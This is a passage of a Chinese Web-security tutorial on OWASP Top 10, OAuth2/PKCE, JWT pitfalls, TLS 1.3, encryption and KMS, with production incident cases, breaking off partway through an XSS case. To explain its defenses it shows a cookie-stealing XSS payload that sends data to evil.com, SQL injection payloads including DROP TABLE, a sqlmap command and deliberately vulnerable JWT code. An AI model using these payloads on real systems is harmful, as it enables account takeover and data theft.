# Web 安全实战 —— OAuth2 / JWT / HTTPS / OWASP Top 10 全防御

> 这是按 [桃花岛深度模板](/STYLE) 写的深文。如果你只想刷面试，看 [安全速记]() 那一节就够了。
> 这里要回答的，是**写代码上线后被白帽子提交漏洞、被监管下整改函、被拖库后复盘**时你需要知道的那部分。

---

## 0. 读这篇之前 —— 8 个自检题

先自检 8 个问题，能秒答 6 个以上，可以跳过本文：

1. OAuth2 的四种 grant type（Authorization Code / Implicit / Password / Client Credentials）各自适用哪种场景？为什么 2024 年起业界明确不推荐 Implicit 和 Password？
2. JWT 被复制到攻击者手里，**在过期之前你能撤销它吗**？如果服务端要做撤销，JWT 还剩多少"无状态"红利？
3. `alg: none` 是什么攻击？为什么标准库 jjwt 早期版本中招？签名验证时哪一行代码必须写、哪一行必须删？
4. HTTPS / TLS 1.3 握手到底有几步？相比 1.2 少了哪一轮 RTT？为什么 0-RTT 有重放风险？
5. CSRF 和 XSS 的根本区别在哪？SameSite Cookie、CSRF Token、CSP、HttpOnly 各防哪一种？
6. SQL 注入用预编译（PreparedStatement）就够了吗？有没有"预编译也防不住"的注入点？
7. 密码哈希在 BCrypt / Argon2 / PBKDF2 里怎么选？盐（salt）和胡椒（pepper）的区别是什么？为什么 BCrypt 输入有 72 字节上限？
8. 依赖里突然爆出 CVE-2021-44228（Log4Shell），你怎么 1 小时内确认线上有没有受影响？SBOM 在这个流程里扮演什么角色？

如果有半数答不上，往下看。

---

## 1. 安全模型 —— 不要只看 Top 10 的清单

绝大多数文章上来就贴 OWASP Top 10 列表，让读者背名词。但**Top 10 只是症状学，不是病理学**。要能上手做安全，必须先有一个能把症状归类的模型。

### 1.1 OWASP Top 10 2021 一览

最新版本（2021，下一版预计 2025 末发布）按风险排序：

| 编号 | 名称 | 一句话理解 |
| --- | --- | --- |
| A01 | Broken Access Control | 越权（横向 / 纵向） |
| A02 | Cryptographic Failures | 加密失败（弱算法 / 明文存储 / 密钥泄漏） |
| A03 | Injection | 注入（SQL / NoSQL / OS Command / LDAP / XSS） |
| A04 | Insecure Design | 设计性缺陷（业务逻辑漏洞） |
| A05 | Security Misconfiguration | 默认配置 / 暴露 endpoint / 错误页泄漏 |
| A06 | Vulnerable and Outdated Components | 依赖 CVE（Log4Shell 类型） |
| A07 | Identification and Authentication Failures | 认证缺陷（弱密码 / Session 固定） |
| A08 | Software and Data Integrity Failures | 供应链 / 反序列化 |
| A09 | Security Logging and Monitoring Failures | 没日志、没告警 |
| A10 | Server-Side Request Forgery | SSRF |

注意 2017 → 2021 的两个关键变化：
- **A04 Insecure Design** 是新增项 —— 业界终于承认"安全不是事后修补，是设计阶段的事"。
- **A06 Vulnerable Components** 从 2017 第 9 升到 2021 第 6 —— Log4Shell、Heartbleed 等供应链事件让大家意识到这是头号风险源之一。

### 1.2 STRIDE 威胁建模

微软在 1999 年提出的威胁建模框架。每个字母代表一类威胁，**和上面 Top 10 几乎一一对应**：

| 字母 | 威胁 | 对应 Top 10 | 防御原则 |
| --- | --- | --- | --- |
| **S**poofing | 身份伪造 | A07 | 强认证（MFA / WebAuthn） |
| **T**ampering | 数据篡改 | A02 / A08 | 完整性校验（HMAC / 签名） |
| **R**epudiation | 抵赖 | A09 | 审计日志（带时间戳 + 防篡改） |
| **I**nformation Disclosure | 信息泄漏 | A02 | 加密 + 最小化暴露 |
| **D**enial of Service | 拒绝服务 | — | 限流 / 熔断 / 弹性扩容 |
| **E**levation of Privilege | 权限提升 | A01 | 最小权限 + 严格授权检查 |

威胁建模的工程化做法：每个新接口/服务上线前画一张数据流图（DFD），针对每个数据流标注 STRIDE 风险，然后给出对应的缓解措施（mitigation）。比"上线后做安全测试"早 6 个月发现问题。

### 1.3 安全左移（Shift Left Security）

传统流程是**测试阶段**才介入安全：渗透测试 → 提 bug → 修 → 复测。这种模式问题：
1. 修复成本是设计阶段的 30~100 倍（业界统计）
2. 临上线发现严重漏洞 → 推迟发布 → 业务背锅
3. 同样的反模式会被不同团队反复犯

左移的具体做法：
- **需求评审**就让安全工程师参与，识别敏感数据流
- **设计阶段**做 STRIDE 威胁建模
- **编码阶段**用 IDE 安全插件（SonarLint Security / Snyk IntelliJ）
- **CI 阶段**自动跑 SAST（Semgrep / SonarQube）+ SCA（Snyk / Dependabot）
- **CD 阶段**自动跑 DAST（OWASP ZAP）
- **运行时**接入 RASP / WAF

每个阶段把"该阶段能拦住的"挡掉。到测试阶段还有的一定是**复杂业务逻辑**漏洞 —— 那个没法自动化。

### 1.4 零信任架构（Zero Trust）

老式安全模型是**城堡式**：内网可信、外网不可信，靠防火墙隔离。问题：一旦攻击者进了内网（钓鱼 / 内鬼 / VPN 撞库），畅通无阻。

零信任的三句话：
1. **永远不信任，始终验证**（Never trust, always verify）
2. **最小权限**（Least privilege per request）
3. **假定已被攻破**（Assume breach）

工程上的体现：
- **mTLS** —— 服务间通信双向验证证书，不依赖"内网就是安全的"
- **SPIFFE / SPIRE** —— 给每个工作负载签发短期身份证书
- **服务网格**（Istio / Linkerd）—— 把 mTLS、授权策略、流量控制下沉到 sidecar
- **设备信任**（Device Trust）—— 用户登录时不仅校验密码，还校验设备是否注册、是否合规

### 1.5 最小权限原则

这是所有安全设计的"祖宗法则"。具体到代码：

```java
// ❌ 服务账号配的是全表写权限
spring.datasource.username=root

// ✅ 只给真正需要的权限
GRANT SELECT, INSERT, UPDATE ON orders TO 'order_service'@'%';
GRANT SELECT ON products TO 'order_service'@'%';
// 没有 DELETE，没有 DROP，没有访问其他表
```

云端也是一样：

```yaml
# ❌ EC2 实例角色给了 AdministratorAccess
- arn: arn:aws:iam::aws:policy/AdministratorAccess

# ✅ 只给读取这一个 S3 bucket 的权限
- effect: Allow
  action: ["s3:GetObject"]
  resource: "arn:aws:s3:::my-bucket/uploads/*"
```

> **口诀**：威胁建模告诉你**会出什么事**；零信任告诉你**怎么防进来**；最小权限告诉你**进来了能搞多大事**。三者合起来才叫"安全模型"，不是 Top 10 那种清单。

---

## 2. 认证与授权切片 —— OAuth2 / JWT / OIDC

认证（Authentication，AuthN）回答"你是谁"；授权（Authorization，AuthZ）回答"你能做什么"。两者经常被混用，但**它们的失败模式完全不同** —— 认证失败 = 冒名顶替；授权失败 = 越权操作。

### 2.1 OAuth2 的 4 种 grant type

OAuth2（RFC 6749）的本质是**第三方授权框架**。它定义了 4 种"授权流程"（grant type），但 2024 年起 IETF 的 [OAuth 2.1 草案](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1)已经明确**砍掉了 Implicit 和 Password 两种**。

| Grant | 适用场景 | 现状 | 关键风险 |
| --- | --- | --- | --- |
| **Authorization Code** | Web 应用 / 移动 App / SPA（配合 PKCE） | **首选** | redirect_uri 劫持 / code 拦截 |
| **Implicit** | 早期 SPA（无后端） | **已废弃** | access_token 直接暴露在 URL fragment |
| **Resource Owner Password Credentials** | 第一方 App（如自家 H5）兼容老系统 | **不推荐** | 用户名密码直接给客户端 |
| **Client Credentials** | 服务间调用（M2M） | 仍推荐 | 客户端凭据泄漏 = 全权限被夺 |

Authorization Code Flow 的标准 5 步：

```
[用户] [客户端 App] [授权服务器] [资源服务器]

  1. 用户点击"用 GitHub 登录"
  2. App 重定向用户到授权服务器：
     https://github.com/login/oauth/authorize
       ?client_id=abc&response_type=code
       &redirect_uri=https://myapp/cb&state=xyz
  3. 用户在授权服务器登录、同意
  4. 授权服务器把用户重定向回 App：
     https://myapp/cb?code=AUTH_CODE&state=xyz
  5. App 后端用 code 换 access_token：
     POST /oauth/token
       grant_type=authorization_code
       code=AUTH_CODE
       client_id=abc
       client_secret=SECRET     ← 后端机密参数
  6. 拿 access_token 调资源服务器
```

**为什么不直接给 token 而要绕这一圈？** 关键在 `client_secret`。它只在第 5 步出现，**全程不经过用户浏览器**。token 不会落到用户能看到的 URL 里。

### 2.2 PKCE 扩展 —— 防止 Authorization Code 拦截

Authorization Code Flow 在**移动 App / SPA** 上有个先天问题：客户端无法安全保管 `client_secret`（反编译就能拿到）。

如果攻击者能拦截到 redirect_uri（比如恶意 App 注册了同样的 URL Scheme），就能拿到 `code`，再用窃取的 `client_secret` 换 token。

PKCE（Proof Key for Code Exchange，RFC 7636）的解法非常巧妙：

```
[App]                          [授权服务器]

1. 生成 code_verifier（随机字符串）
   code_challenge = SHA256(code_verifier)

2. 重定向时带上 code_challenge：
   /authorize?...&code_challenge=XYZ&code_challenge_method=S256

                                3. 服务器记下 code_challenge
                                4. 返回 code

5. 换 token 时带上 code_verifier：
   POST /token
     code=AUTH_CODE
     code_verifier=ORIGINAL_RANDOM

                                6. 服务器验证 SHA256(code_verifier) == code_challenge
                                   匹配 → 发 token
```

**核心思想**：把"持有 client_secret"换成"证明你是发起 authorize 请求的那个人"。攻击者就算拿到 code，也没有当时随机生成的 code_verifier。

OAuth 2.1 强制要求所有 Authorization Code Flow 都用 PKCE，不管客户端是否能保管机密。

### 2.3 OIDC —— 在 OAuth2 之上加 ID Token

OAuth2 解决的是"授权"（让 App 能代表用户访问资源），不是"认证"（告诉 App 用户是谁）。

OpenID Connect（OIDC）在 OAuth2 之上加了一层：**ID Token**。它是个 JWT，载荷里包含用户标识（sub）、邮箱、姓名等 claim。

```
OAuth2 流程返回的：
{
  "access_token": "abc...",
  "token_type": "Bearer",
  "expires_in": 3600
}

OIDC 流程额外返回：
{
  "access_token": "abc...",
  "id_token": "eyJhbGc...",   ← 这是 JWT
  "token_type": "Bearer",
  "expires_in": 3600
}
```

ID Token 解码后类似：

```json
{
  "iss": "https://accounts.google.com",
  "sub": "10769150350006150715113",
  "email": "user@example.com",
  "email_verified": true,
  "aud": "your-client-id.apps.googleusercontent.com",
  "exp": 1700000000,
  "iat": 1699996400
}
```

**关键认识**：
- access_token 是给资源服务器看的（你能访问什么）
- ID Token 是给客户端 App 看的（用户是谁）
- 两者别混用 —— 见后面案例 ⑩

### 2.4 JWT 结构

JWT（RFC 7519）三段，用 `.` 分隔：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
  .eyJzdWIiOiIxMjM0NSIsImV4cCI6MTcwMDAwMDAwMH0
  .h7mPx8WnYx-ABC...
```

| 段 | Base64Url 解码后 |
| --- | --- |
| Header | `{"alg":"HS256","typ":"JWT"}` |
| Payload | `{"sub":"12345","exp":1700000000}` |
| Signature | `HMAC-SHA256(base64(header) + "." + base64(payload), secret)` |

注意：Header 和 Payload 是 **Base64Url 编码，不是加密**。任何人拿到 JWT 都能解出里面的内容。

JWT 里**不要放敏感信息**（密码、银行卡、地址）。要放就用 JWE（JSON Web Encryption），它是加密版的 JWT，但工程复杂度高得多。

### 2.5 JWT 安全风险 —— 三大坑

#### 坑 1：alg=none 攻击

最经典的 JWT 漏洞。攻击者把 Header 改成：

```json
{"alg": "none", "typ": "JWT"}
```

把 Payload 改成想要的内容（比如 `"sub": "admin"`），Signature 部分留空。

如果服务端验证逻辑写错了：

```java
// ❌ 致命写法
Jwts.parser().parse(token);   // 没有要求验签
// 或
Jwts.parser().setSigningKey(key).parse(token);   // ← 老版本 jjwt 不强制 alg 检查
```

服务端按 Header 里的 `alg: none` "验签"（实际上不验），就接受了攻击者构造的 token。

正确做法：

```java
// ✅ 显式锁定算法
Jwts.parserBuilder()
    .require("alg", "HS256")            // 锁定签名算法
    .setSigningKey(key)
    .build()
    .parseClaimsJws(token);
```

或用更严格的 API：

```java
JwtParser parser = Jwts.parserBuilder()
    .setSigningKeyResolver(new SigningKeyResolverAdapter() {
        @Override
        public Key resolveSigningKey(JwsHeader header, Claims claims) {
            // 收到的 header 是签名前的，alg 必须是预期值
            if (!"HS256".equals(header.getAlgorithm()))
                throw new JwtException("Unexpected alg: " + header.getAlgorithm());
            return key;
        }
    })
    .build();
```

#### 坑 2：算法混淆攻击（HS256 / RS256 confusion）

服务端用 RS256（非对称），公钥公开。攻击者把 Header 改成 `alg: HS256`（对称），用**公钥作为 HMAC 密钥**重新签名。

如果服务端的代码是这种通用形式：

```java
Jwts.parser().setSigningKey(publicKey).parse(token);   // 致命
```

`setSigningKey` 在 HS256 模式下把传入的 key 作为对称密钥用 —— 攻击者签的 token 直接验通过。

防御：永远把 alg 锁死，不让客户端 Header 决定算法。

#### 坑 3：JWT 不可撤销

这是 JWT 的**根本性设计缺陷**，不是 bug。

JWT 是无状态的：服务端不存 session，每次请求验签就行。但如果用户密码泄漏、设备丢失、需要踢下线，怎么办？token 还在攻击者手里，且没过期。

业界的几种 workaround：

| 方案 | 说明 | 代价 |
| --- | --- | --- |
| **短 exp + Refresh Token** | access_token 5 分钟过期，refresh_token 才能撤销 | 仍有 5 分钟攻击窗口 |
| **黑名单（denylist）** | 把撤销的 jti 存 Redis | 失去无状态红利 |
| **白名单（allowlist）** | 只接受存在于 Redis 的 jti | 同上 |
| **滚动密钥** | 定期换签名密钥 | 全员重新登录 |
| **改用 Session** | 直接存 Session ID | 等于不用 JWT |

业界共识：**真正需要"立即撤销"的场景就别用 JWT，用 Session**。JWT 适合微服务间短期凭证（比如 access_token 过期 5 分钟）+ 服务端有 refresh_token 撤销能力。

### 2.6 Refresh Token 的轮换

Refresh Token 是 access_token 过期后用来换新 token 的"长期凭据"，自然也是高价值目标。如果 refresh_token 泄漏，攻击者就能持续刷新 access_token。

工业级做法：**Refresh Token Rotation**（RFC 6749 OAuth 2.0 Best Current Practice）。

```
1. 用 refresh_token_v1 换 access_token
   服务器返回 access_token + refresh_token_v2
   并把 v1 标记为已使用

2. 下次刷新用 refresh_token_v2
   服务器返回新 access_token + refresh_token_v3

3. 如果有人尝试用 refresh_token_v1（已使用过的）
   服务器立即吊销整条令牌链 + 强制重新登录
   ★ 这意味着：要么是合法用户重发了同一请求（罕见）
                 要么是攻击者偷了旧 token（这就是检测信号）
```

Spring Authorization Server 实现：

```java
@Bean
public RegisteredClientRepository registeredClientRepository() {
    RegisteredClient client = RegisteredClient.withId(UUID.randomUUID().toString())
        .clientId("my-app")
        .clientSecret(passwordEncoder.encode("secret"))
        .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
        .authorizationGrantType(AuthorizationGrantType.REFRESH_TOKEN)
        .tokenSettings(TokenSettings.builder()
            .accessTokenTimeToLive(Duration.ofMinutes(5))
            .refreshTokenTimeToLive(Duration.ofDays(30))
            .reuseRefreshTokens(false)        // ★ 启用 rotation
            .build())
        .build();
    return new InMemoryRegisteredClientRepository(client);
}
```

`reuseRefreshTokens(false)` 是关键，开启后每次刷新都会发新 refresh_token 并失效旧的。

### 2.7 Spring Security OAuth2 接入（资源服务器侧）

最常见场景：你写一个微服务，要校验调用方带的 JWT。

`pom.xml`：

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-resource-server</artifactId>
</dependency>
```

`application.yml`：

```yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: https://auth.example.com
          # 或 jwk-set-uri: https://auth.example.com/.well-known/jwks.json
```

`SecurityConfig`：

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity                                // 启用 @PreAuthorize
public class SecurityConfig {

    @Bean
    SecurityFilterChain api(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(a -> a
                .requestMatchers("/actuator/health").permitAll()
                .requestMatchers("/api/admin/**").hasAuthority("SCOPE_admin")
                .anyRequest().authenticated())
            .oauth2ResourceServer(o -> o.jwt(j -> j
                .jwtAuthenticationConverter(jwtAuthConverter())))
            .csrf(csrf -> csrf.disable())             // REST API 用 token 鉴权可禁 CSRF
            .sessionManagement(s -> s
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS));
        return http.build();
    }

    private JwtAuthenticationConverter jwtAuthConverter() {
        var grantedAuthoritiesConverter = new JwtGrantedAuthoritiesConverter();
        grantedAuthoritiesConverter.setAuthoritiesClaimName("roles");
        grantedAuthoritiesConverter.setAuthorityPrefix("ROLE_");
        var converter = new JwtAuthenticationConverter();
        converter.setJwtGrantedAuthoritiesConverter(grantedAuthoritiesConverter);
        return converter;
    }
}
```

业务里取用户：

```java
@GetMapping("/me")
public Map<String, Object> me(@AuthenticationPrincipal Jwt jwt) {
    return Map.of(
        "sub", jwt.getSubject(),
        "email", jwt.getClaimAsString("email"),
        "roles", jwt.getClaimAsStringList("roles")
    );
}

@PreAuthorize("hasRole('ADMIN')")
@DeleteMapping("/users/{id}")
public void deleteUser(@PathVariable Long id) { ... }
```

> **口诀**：OAuth2 是授权框架，OIDC 在它上面加认证。**Authorization Code + PKCE 是 2024 起的唯一推荐路径**；JWT 三大坑（alg=none / 算法混淆 / 不可撤销）必须在编码时 by design 防住。

---

## 3. 加密与传输 —— 不要自己造轮子

密码学有句老话：**Don't roll your own crypto**。任何"自己设计的加密算法"几乎一定有问题。这一节梳理工程里你真正需要做选型的几个层面。

### 3.1 对称加密 —— AES-GCM 是当前默认

对称加密：加密解密用同一把密钥。快，适合大量数据。

工业上 95% 的场景用 **AES-GCM**：

```java
public byte[] encrypt(byte[] plaintext, SecretKey key) throws Exception {
    byte[] iv = new byte[12];                   // GCM 推荐 12 字节
    SecureRandom.getInstanceStrong().nextBytes(iv);

    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
    byte[] ciphertext = cipher.doFinal(plaintext);

    // 拼接 IV + ciphertext，解密时分开
    return ByteBuffer.allocate(iv.length + ciphertext.length)
        .put(iv).put(ciphertext).array();
}
```

为什么不是 AES-CBC？
- CBC 模式没有内置完整性校验，需要额外的 HMAC（"先加密再 MAC"，Encrypt-then-MAC 模式）
- CBC 一旦实现错（如 padding oracle 攻击），明文就泄漏
- GCM 自带认证（AEAD，Authenticated Encryption with Associated Data），单一原语解决加密 + 完整性

**AES-GCM 的两个致命陷阱**：

1. **同一把密钥 + 同一个 IV 加密两次不同明文 → 明文异或被攻击者拿到**。所以 IV 必须每次随机生成（不能用计数器除非严格保证不重复）。
2. **加密次数有上限**（同一密钥 GCM 不应加密超过 2³² 个块），生产中要做密钥轮换。

如果觉得 AES 慢（特别是没有 AES-NI 硬件加速的 CPU），考虑 **ChaCha20-Poly1305**：

```java
Cipher cipher = Cipher.getInstance("ChaCha20-Poly1305");
```

它在 ARM 移动设备和老 x86 上比软件 AES 快 3 倍，安全性等价。Google QUIC 协议默认用它。

### 3.2 非对称加密 —— ECC 替代 RSA

非对称：公钥加密，私钥解密；或私钥签名，公钥验签。慢，适合密钥交换和签名。

| 算法 | 密钥长度 | 等效安全性 | 工程现状 |
| --- | --- | --- | --- |
| RSA 2048 | 2048 bit | 112 bit | 仍可接受，但生成慢、密钥大 |
| RSA 3072 | 3072 bit | 128 bit | 等价 ECC P-256 安全级别 |
| RSA 4096 | 4096 bit | 152 bit | 性能差，新系统不推荐 |
| **ECDSA P-256** | 256 bit | 128 bit | **新系统首选**，签名/验证都快 |
| **Ed25519** | 256 bit | 128 bit | **更新更安全**（无 nonce 复用风险），SSH/Signal 默认 |

工程层面 ECC 比 RSA 的优势：
- 密钥小：256 bit 对应 RSA 3072 的安全等级
- 签名快：硬件加速好做
- TLS 握手开销低

Java 21 生成 Ed25519 密钥对：

```java
KeyPairGenerator gen = KeyPairGenerator.getInstance("Ed25519");
KeyPair pair = gen.generateKeyPair();
```

注意：JDK 15+ 才内置 Ed25519。早期项目可能要靠 BouncyCastle。

### 3.3 TLS 1.3 握手过程

TLS 1.3（RFC 8446，2018）相比 1.2 的最大变化是**握手只要 1 RTT**（之前是 2 RTT），且支持 0-RTT 重连。

完整 1-RTT 握手：

```
Client                                Server
  |                                      |
  |  ClientHello                         |   ① 客户端发：
  |  - 支持的 cipher suites              |     - 支持的密码套件列表
  |  - key_share (DH 公钥)               |     - 自己生成的 DH 公钥
  |  - signature_algorithms              |     - 支持的签名算法
  |─────────────────────────────────────►|
  |                                      |
  |              ServerHello             |   ② 服务端回：
  |              - 选定的 cipher suite   |     - 选定的套件
  |              - key_share (DH 公钥)   |     - 自己生成的 DH 公钥
  |              {EncryptedExtensions}   |     - ★ 之后所有消息加密
  |              {Certificate}           |     - 服务端证书
  |              {CertificateVerify}     |     - 用私钥签整个握手
  |              {Finished}              |     - HMAC 整个握手摘要
  |◄─────────────────────────────────────|
  |                                      |
  |  {Finished}                          |   ③ 客户端验签 + 回 Finished
  |─────────────────────────────────────►|
  |                                      |
  |  [Application Data]                  |   ④ 开始传业务数据
  |◄────────────────────────────────────►|
```

**关键改进**：
1. ServerHello 之后所有消息**立即加密**（用临时 DH 推算的握手密钥），不再有 1.2 的 ChangeCipherSpec
2. **强制前向保密**（Forward Secrecy）—— 不再支持 RSA 密钥交换。即使私钥未来泄漏，过去的会话也无法解密
3. **去掉了一堆历史包袱**：MD5/SHA1 / RC4 / DES / 静态 RSA / 自定义 DH 参数 全部砍掉

0-RTT 模式可以让重连客户端在第一个包就附带应用数据：

```
Client                                Server
  |  ClientHello + EarlyData             |   ★ 直接带业务数据
  |─────────────────────────────────────►|
  |              ServerHello + ...       |
  |◄─────────────────────────────────────|
```

但 **0-RTT 数据不防重放** —— 攻击者可以截获后重发同样的请求。所以 0-RTT 只能用在幂等请求（GET / 查询），不能用于 POST 转账。

### 3.4 国密算法 —— SM2 / SM3 / SM4

国密是中国国家密码管理局发布的算法系列，金融、政务、医疗等行业的合规要求。

| 国密 | 国际等价 | 用途 |
| --- | --- | --- |
| **SM2** | ECDSA P-256 | 非对称加密 / 签名 |
| **SM3** | SHA-256 | 哈希 |
| **SM4** | AES-128 | 对称加密 |

JDK 不内置，常用 BouncyCastle 实现：

```xml
<dependency>
    <groupId>org.bouncycastle</groupId>
    <artifactId>bcprov-jdk18on</artifactId>
    <version>1.78</version>
</dependency>
```

```java
Security.addProvider(new BouncyCastleProvider());

// SM4 加密
Cipher cipher = Cipher.getInstance("SM4/CBC/PKCS7Padding", "BC");
cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(iv));
byte[] ct = cipher.doFinal(plaintext);

// SM3 哈希
MessageDigest md = MessageDigest.getInstance("SM3", "BC");
byte[] hash = md.digest(input);
```

注意：SM4 CBC 模式同样有 padding oracle 风险。如果允许，用 GCM 模式（SM4-GCM 是国标 GB/T 36624 定义的）。

### 3.5 KMS 的工程化使用

KMS（Key Management Service）解决"密钥怎么保管"的根本问题。AWS KMS / 阿里云 KMS / Google Cloud KMS / HashiCorp Vault 都属于这一类。

核心模式：**信封加密**（Envelope Encryption）。

```
1. 应用要加密一份数据
2. 调 KMS 生成一把"数据密钥"（DEK，Data Encryption Key）：
     KMS 返回：plaintextDEK + encryptedDEK（用 KMS 主密钥 KEK 加密的版本）
3. 应用用 plaintextDEK 加密数据，得到 ciphertext
4. 应用存储：ciphertext + encryptedDEK
5. 应用立即清掉内存里的 plaintextDEK
6. 解密时：拿 encryptedDEK 调 KMS 解密 → 得 plaintextDEK → 解 ciphertext
```

为什么这么绕？
- KMS 的吞吐有限（AWS 默认 5500 TPS），不可能每条数据都直接调 KMS
- 主密钥（KEK）从不离开 KMS —— 即使应用被攻破，攻击者拿到的也只是 ciphertext + encryptedDEK，没有 KEK 解不开
- DEK 可以本地缓存几分钟，进一步降 KMS 调用

AWS SDK 示例：

```java
AwsCrypto crypto = AwsCrypto.builder()
    .withCommitmentPolicy(CommitmentPolicy.RequireEncryptRequireDecrypt)
    .build();

KmsMasterKeyProvider keyProvider = KmsMasterKeyProvider.builder()
    .buildStrict("arn:aws:kms:ap-southeast-1:123456:key/abc-def");

CryptoResult<byte[], KmsMasterKey> result = crypto.encryptData(keyProvider, plaintext);
byte[] ciphertext = result.getResult();    // 含 encryptedDEK + ciphertext
```

### 3.6 字段级加密 vs 全表加密

两种粒度，权衡不同：

| 维度 | 字段级（应用层）| 全表（DB 层 TDE） |
| --- | --- | --- |
| 粒度 | 单个字段 | 整张表/库的物理文件 |
| 防御 | 防 DB 拖库 + 防内部 DBA 看到明文 | 仅防物理介质失窃 |
| 性能影响 | 加密的字段不能直接查（要么前缀索引，要么用确定性加密） | 几乎无 |
| 实施成本 | 高（业务代码侵入） | 低（DB 配置） |
| 合规 | PCI DSS / GDPR 推荐 | 不够 |

工业建议：
- **PII / 信用卡 / 密码哈希** 用字段级加密
- **整库** 同时开 TDE，作为"最后一道墙"

字段级加密里，**确定性加密（Deterministic Encryption）**让密文支持等值查询：

```java
// 同一明文 + 同一密钥 → 同一密文（用零 IV 或派生 IV）
ciphertext = AES-SIV(plaintext, key)
```

代价：失去语义安全（攻击者能知道两个密文是否对应同一明文）。**所以确定性加密只用于"必须支持等值查询"的字段**（如手机号查重），其他用 GCM。

> **口诀**：对称选 AES-GCM 或 ChaCha20-Poly1305；非对称选 Ed25519；TLS 必须 1.3；密钥用 KMS 信封加密；字段级加密给 PII，TDE 兜底物理。**永远不要自己实现密码算法**。

---

## 4. 生产案例 10 则

> 每个案例固定四块：**现象 / 根因 / 修复 / 验证**。这一节是本文长尾价值的核心。

### 案例 ① JWT 泄漏后无法撤销 —— "员工离职后 token 还能用一周"

#### 现象
某 SaaS 平台员工离职，IT 在 IAM 系统里禁用了账户。但 7 天后审计发现，该员工的 JWT 还在被外部 IP 持续使用 —— 调内部 API 拉了几千份合同 PDF。

#### 根因
该平台的 access_token 设了 7 天过期（产品要求"减少登录次数"）。JWT 是无状态的，账户禁用只能阻止"重新登录获取新 token"，**对已发出的 token 完全无效**。

7 天 × 离职员工的 access_token = 7 天的攻击窗口。

更糟的是该平台没有 refresh_token rotation，refresh_token 也是 30 天有效，攻击者就算等 7 天 token 过期也能用 refresh_token 再换新的。

#### 修复
**短期止血**：紧急轮换签名密钥（HMAC secret 或 RSA 密钥对），让所有现有 JWT 失效。代价是全员重新登录。

**长期改造**：
1. 缩短 access_token 有效期到 5~15 分钟
2. 使用 refresh_token + rotation
3. 为关键操作加二次验证（短信 / TOTP / 风控）
4. 维护一个"已撤销 jti 黑名单"，校验时查 Redis：

```java
@Component
public class JwtRevocationFilter extends OncePerRequestFilter {
    private final RedisTemplate<String, String> redis;

    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse resp,
                                     FilterChain chain) throws IOException, ServletException {
        String token = extractToken(req);
        if (token != null) {
            String jti = parseJti(token);
            if (Boolean.TRUE.equals(redis.hasKey("jwt:revoked:" + jti))) {
                resp.sendError(401, "Token revoked");
                return;
            }
        }
        chain.doFilter(req, resp);
    }
}

// 离职 / 登出时
public void revoke(String jti, long exp) {
    long ttl = exp - System.currentTimeMillis() / 1000;
    if (ttl > 0) redis.opsForValue().set("jwt:revoked:" + jti, "1", ttl, TimeUnit.SECONDS);
}
```

注意 TTL 设成 token 剩余有效期 —— 过期后 Redis 自动清理，避免黑名单无限增长。

#### 验证
```bash
# 模拟离职：撤销某用户的 jti
curl -X POST localhost:8080/admin/revoke -d '{"jti":"abc-123"}'

# 该用户原 token 应立即返回 401
curl -H 'Authorization: Bearer <token>' localhost:8080/api/me
```

> **口诀**：JWT 的"无状态"和"可撤销"不可兼得。**默认要可撤销**：短 access_token + Refresh Rotation + 黑名单 = 真生产级配置。

---

### 案例 ② SQL 注入：拼接字符串

#### 现象
渗透测试报告：某商品搜索接口能拖出全表用户数据。

测试 payload：
```
GET /products/search?keyword=' UNION SELECT username, password FROM users--
```

返回了前 N 个用户的用户名 + 密码哈希。

#### 根因
代码里这样拼 SQL：

```java
// ❌ 致命写法
String sql = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'";
jdbcTemplate.query(sql, mapper);
```

`keyword` 来自 HTTP 参数，攻击者可以闭合单引号、注入 UNION，让查询返回任意表数据。

#### 修复
**唯一正确做法**：永远用预编译参数。

```java
// ✅ 预编译
String sql = "SELECT * FROM products WHERE name LIKE ?";
jdbcTemplate.query(sql, new Object[]{"%" + keyword + "%"}, mapper);
```

MyBatis 用 `#{}` 而不是 `${}`：

```xml
<!-- ❌ ${} 是字符串拼接 -->
<select id="search">
  SELECT * FROM products WHERE name LIKE '%${keyword}%'
</select>

<!-- ✅ #{} 是预编译参数 -->
<select id="search">
  SELECT * FROM products WHERE name LIKE CONCAT('%', #{keyword}, '%')
</select>
```

#### 预编译"防不住"的场景

预编译只能参数化**值**，不能参数化**结构**（表名、列名、ORDER BY 字段）：

```java
// ❌ 这种就算预编译也防不住
String sql = "SELECT * FROM products ORDER BY " + sortColumn;
```

如果 `sortColumn` 来自 HTTP 参数，攻击者可以传 `name; DROP TABLE users--`。

正确做法：**白名单**。

```java
private static final Set<String> ALLOWED_SORTS = Set.of("id", "name", "price", "created_at");

if (!ALLOWED_SORTS.contains(sortColumn)) {
    throw new IllegalArgumentException("invalid sort: " + sortColumn);
}
String sql = "SELECT * FROM products ORDER BY " + sortColumn;
```

类似的还有：动态表名、动态字段拼接 IN 子句的元素数量。**任何"必须拼到 SQL 结构"的地方，必须白名单**。

#### 验证
```bash
# SQLMap 自动化测试
sqlmap -u 'http://localhost:8080/products/search?keyword=test' --batch --risk=3 --level=5
```

修复前应该报告大量注入点，修复后应全部安全。

> **口诀**：**值用预编译，结构用白名单**。MyBatis 见到 `${` 提高警惕。SQLMap 是上线前必跑一次的工具。

---

### 案例 ③ XSS：用户内容直接渲染

#### 现象
用户在论坛发了一条评论，内容为：

```html
<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

所有看到这条评论的用户，cookie 都被发到了 evil.com。

#### 根因
后端把用户输入直接存 DB，前端模板直接 `{{ comment }}` 渲染（没转义）。这是**存储型 XSS**。

XSS 三种：
- **反射型**：payload 在 URL 里，点击链接触发（一次性）
- **存储型**：payload 存到 DB，每个看到的用户都中招（最严重）
- **DOM 型**：payload 在前端 JS 处理时被注入到 DOM（不经过后端）

#### 修复
**根本原则**：**输出时按上下文转义**，不是输入时净化。

